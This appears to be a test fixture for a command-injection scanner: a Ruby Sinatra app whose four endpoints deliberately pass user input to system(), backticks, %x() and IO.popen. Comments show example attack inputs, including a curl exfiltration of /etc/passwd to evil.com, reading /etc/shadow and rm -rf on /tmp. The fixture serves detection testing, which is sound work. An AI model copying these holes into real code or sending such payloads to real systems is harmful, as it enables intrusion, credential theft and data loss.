# Fixture: ruby-system-interp — system() with string interpolation
# Expected: TRUE POSITIVE (high confidence)
# CWE: CWE-78
# Agent: cmdi
# Pattern: User input interpolated into system(), backticks, %x(), or Kernel.exec

require "sinatra"
require "json"

# VULNERABLE: user-controlled filename in system() via string interpolation
# Attacker sends: POST filename=report.csv;+curl+http://evil.com/exfil?d=$(cat+/etc/passwd)
post "/api/export" do
  content_type :json
  data = JSON.parse(request.body.read)
  filename = data["filename"]
  export_dir = "/var/app/exports"

  # VULNERABLE: string interpolation into system()
  system("csv2pdf --input #{export_dir}/#{filename} --output #{export_dir}/#{filename}.pdf")
  { status: "exported", file: "#{filename}.pdf" }.to_json
end

# VULNERABLE: user-controlled host in backtick command
# Attacker sends: GET /api/ping?host=127.0.0.1;+id
get "/api/ping" do
  content_type :json
  host = params[:host]

  # VULNERABLE: backtick operator with interpolation
  result = `ping -c 3 #{host} 2>&1`
  { output: result, host: host }.to_json
end

# VULNERABLE: user-controlled branch name in %x() shell command
# Attacker sends: GET /api/repo/log?branch=main;+cat+/etc/shadow
get "/api/repo/log" do
  content_type :json
  branch = params[:branch]
  repo_path = params[:repo] || "/var/repos/default"

  # VULNERABLE: %x() is equivalent to backticks
  log_output = %x(cd #{repo_path} && git log --oneline -20 #{branch})
  { log: log_output.split("\n") }.to_json
end

# VULNERABLE: user-controlled domain in Kernel.exec via Open3
# Attacker sends: POST domain=example.com;+rm+-rf+/tmp/*
post "/api/ssl-check" do
  content_type :json
  data = JSON.parse(request.body.read)
  domain = data["domain"]

  # VULNERABLE: interpolation into shell command via IO.popen
  io = IO.popen("echo | openssl s_client -servername #{domain} -connect #{domain}:443 2>/dev/null | openssl x509 -noout -dates")
  output = io.read
  io.close
  { domain: domain, cert_info: output }.to_json
end
